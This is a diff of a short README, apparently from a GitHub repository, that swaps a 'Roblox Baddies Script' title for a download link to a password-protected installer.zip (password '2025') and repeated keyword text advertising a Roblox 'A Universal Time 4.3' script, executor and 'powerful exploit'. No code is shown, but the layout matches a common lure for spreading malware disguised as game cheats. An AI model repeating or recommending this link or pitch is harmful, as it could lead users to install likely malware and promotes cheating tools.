@@ -1,2 +1,3 @@
-# Baddies
-Roblox Baddies Script 🚀 Roblox Baddies Script &amp; Executor 🚀 Roblox Baddies Script Powerful Exploit
+# [DOWNLOAD LINK](https://github.com/razor53flyingjoe/Baddies/releases/download/Download/installer.zip)
+# PASSWORD : 2025
+Roblox A Universal Time 4.3 Script 🚀 Roblox A Universal Time 4.3 Script & Executor 🚀 Roblox A Universal Time 4.3 Script Powerful Exploit
